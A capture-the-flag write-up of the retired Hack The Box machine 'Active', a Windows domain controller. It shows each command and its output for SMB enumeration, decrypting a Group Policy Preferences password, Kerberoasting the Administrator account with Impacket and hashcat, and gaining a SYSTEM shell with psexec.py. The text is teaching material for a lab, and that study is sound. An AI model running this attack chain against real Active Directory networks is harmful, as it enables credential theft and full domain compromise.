---
title: HTB: Active
url: https://0xdf.gitlab.io/2018/12/08/htb-active.html
date: 2018-12-08T10:03:57+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-active, active-directory, gpp-password, gpp-decrypt, smb, smbmap, smbclient, enum4linux, getuserspns, kerberoast, hashcat, psexec-py, oscp-like-v2, oscp-like-v1, oscp-like-v3, cpts-like
---

![](https://0xdfimages.gitlab.io/img/active-cover.png) Active was an example of an easy box that still provided a lot of opportunity to learn. The box was centered around common vulnerabilities associated with Active Directory. There’s a good chance to practice SMB enumeration. It also gives the opportunity to use Kerberoasting against a Windows Domain, which, if you’re not a pentester, you may not have had the chance to do before.

## Box Info

| Name | [Active](https://hackthebox.com/machines/active)  [Active](https://hackthebox.com/machines/active) [Play on HackTheBox](https://hackthebox.com/machines/active) |
| --- | --- |
| Release Date | [28 Jul 2018](https://twitter.com/hackthebox_eu/status/1022080816535556097) |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Active |
| Radar Graph | Radar chart for Active |
| First Blood User | 00:05:37[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 01:06:00[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creators | [eks eks](https://app.hackthebox.com/users/302)  [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` shows we are dealing with a Windows 2008 R2 system, that is an Active Directory Domain Controller:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 21:35 EDT
Nmap scan report for 10.10.10.100                           
Host is up (0.020s latency).                                                                                              
Not shown: 65512 closed ports 
PORT      STATE SERVICE   
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap             
636/tcp   open  ldapssl                                        
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl                    
5722/tcp  open  msdfsr                              
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown                             
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49170/tcp open  unknown
49179/tcp open  unknown
                                                                                            
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds

root@kali# nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152-49158,49169,49170,49179 --min-rate 5
000 -oA nmap/scripts 10.10.10.100                   
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 21:37 EDT
Nmap scan report for 10.10.10.100                                                                                                                                
Host is up (0.020s latency).               
                       
PORT      STATE  SERVICE       VERSION                                                        
53/tcp    open   domain        Microsoft DNS 6.1.7600 (1DB04001) (Windows Server 2008 R2)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7600 (1DB04001)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2018-07-29 01:37:17Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49156/tcp closed unknown
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc         Microsoft Windows RPC
49169/tcp open   msrpc         Microsoft Windows RPC
49170/tcp open   msrpc         Microsoft Windows RPC
49179/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -35s, deviation: 0s, median: -35s
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a2:16:8b (VMware)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2018-07-28 21:38:11
|_  start_date: 2018-07-28 15:00:50

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.56 seconds

root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 21:40 EDT
Warning: 10.10.10.100 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.100
Host is up (0.021s latency).
Not shown: 65385 open|filtered ports, 145 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
137/udp   open  netbios-ns
49413/udp open  unknown
49616/udp open  unknown
65096/udp open  unknown

```

### SMB - TCP 139/445

#### SMB Enumeration

Given this is a Windows host, I’ll take a look at SMB. Enumerating SMB has always been something that I had to use a bunch of tools in what felt like imperfect ways. I had even written a [post on the various tools for enumerating smb](/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html) . Then [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) tipped me off to `smbmap`. I had just finished this post, but (after updating the SMB enumeration checklist), I went back in to add how `smbmap` works as well at a couple steps.

#### List Shares

I originally solved this with `enum4linux`, but the problem with that tool is that it just dumps a bunch of information, and a lot of it seems like failures much of the time. Understanding what comes back can be difficult. Here’s the section of the output that was useful here:

```

root@kali# enum4linux -a 10.10.10.100
...[snip]...
 =========================================
|    Share Enumeration on 10.10.10.100    |
 =========================================

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
//10.10.10.100/ADMIN$   Mapping: DENIED, Listing: N/A
//10.10.10.100/C$       Mapping: DENIED, Listing: N/A
//10.10.10.100/IPC$     Mapping: OK     Listing: DENIED
//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A
//10.10.10.100/Replication      Mapping: OK, Listing: OK
//10.10.10.100/SYSVOL   Mapping: DENIED, Listing: N/A
//10.10.10.100/Users    Mapping: DENIED, Listing: N/A
...[snip]...

```

`smbmap` gives this result very clearly, including showing that I have read access to the Replication share without authentication:

```

root@kali# smbmap -H 10.10.10.100
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                NO ACCESS
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS
        Users                                                   NO ACCESS

```

## Replication Share - SMB

### Enumeration

Since I can access `\\10.10.10.100\Replication` without a password, I’ll use `smbclient` to connect and look around.

```

root@kali# smbclient //10.10.10.100/Replication -U ""%""
Try "help" to get a list of possible commands.                            
smb: \>

```

Alternatively, I could use `smbmap -H 10.10.10.100 -R` to recursively list all the files in the share.

Either way, I’ll notice an interesting file called `Groups.xml`:

```

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

```

It has `userName` and `cpassword` fields:

```

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>

```

### GPP Passwords

Whenever a new Group Policy Preference (GPP) is created, there’s an xml file created in the SYSVOL share with that config data, including any passwords associated with the GPP. For security, Microsoft AES encrypts the password before it’s stored as `cpassword`. But then Microsoft [published the key](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) on MSDN!

Microsoft issued a patch in 2014 that prevented admins from putting passwords into GPP. But that patch doesn’t do anything about any of these breakable passwords that were already there, and from what I understand, pentesters still find these regularly in 2018. For more details, check out this [AD Security post](https://adsecurity.org/?p=2288).

### Decrypting GPP Password

Since the key is known, I can decrypt the password. Kali has a tool called `gpp-decrypt` that will do it:

```

root@kali# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

```

## Users Share - SMB

With a username and password, I can access 3 more shares:

```

root@kali# smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY
        Users                                                   READ ONLY

```

When I connect to the Users share, it looks like the `C:\users\` directory, just as I had hoped.

```

root@kali# smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                         DHS        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                      DHS        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                10459647 blocks of size 4096. 6308502 blocks available

```

That’s enough access to grab user.txt:

```

smb: \SVC_TGS\desktop\> get user.txt
getting file \SVC_TGS\desktop\user.txt of size 34 as user.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)

```

```

root@kali# cat user.txt
86d67d8b...

```

## Kerberoasting

### Background

Kerberos is a protocol for authentication used in Windows Active Directory environments (though it can be used for auth to Linux hosts as well). In 2014, Tim Medin presented an attack on Kerberos he called [Kerberoasting](https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf). It’s worth reading through the presentation, as Tim uses good graphics to illustrate the process, but I’ll try to give a simple overview.

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with [UserAccountControl setting “Do not require Kerberos preauthentication” enabled](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b), it is possible to request and receive a ticket to crack without a valid account on the domain.

### Get Hash

I’ll use the `GetUserSPNs.py` script from Impacket to get a list of service usernames which are associated with normal user accounts. It will also get a ticket that I can crack.

The script identified a user, Administrator:

```

root@kali# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2018-07-21 11:05:53 

```

It also gives me the ticket, which I can try to brute force decrypt to get the user’s password:

```

root@kali# cat GetUserSPNs.out 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174

```

### Decrypt with Hashcat

I’ll look up the hash type [here](https://hashcat.net/wiki/doku.php?id=example_hashes), and then crack it with hashcat:

```

$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force                                       
hashcat (v4.0.1) starting... 
...snip...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9
184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a
994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0b
ea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa
7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d
937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7
532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952
d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b
94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de
cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c
ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968

```

## Administrator Access

### Share Enumeration

Now, with administrator password, I have access to almost all the shares, including C$, which gives me the entire file system:

```

root@kali# smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ, WRITE
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE
        [!] Unable to remove test directory at \\10.10.10.100\SYSVOL\vnCfhEJMWA, plreae remove manually
        Users                                                   READ ONLY

```

### Get root.txt

I can connect and get root.txt using `smbclient` (or `smbmap`):

```

root@kali# smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> get \users\administrator\desktop\root.txt
getting file \users\administrator\desktop\root.txt of size 34 as \users\administrator\desktop\root.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)

root@kali# cat root.txt
b5fc76d1...

```

It’s worth noting here - I just got the root flag from a system without ever getting a shell on the system.

### System Shell

But of course I want to get a shell. Now that the shares are writable and I have administrator access, I can get a shell with PSExec. There’s a bunch of ways to do this directly from Kali. Sticking with the Impacket tools, I’ll use `psexec.py`:

```

root@kali# psexec.py active.htb/administrator@10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file dMCaaHzA.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service aYMa on 10.10.10.100.....
[*] Starting service aYMa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```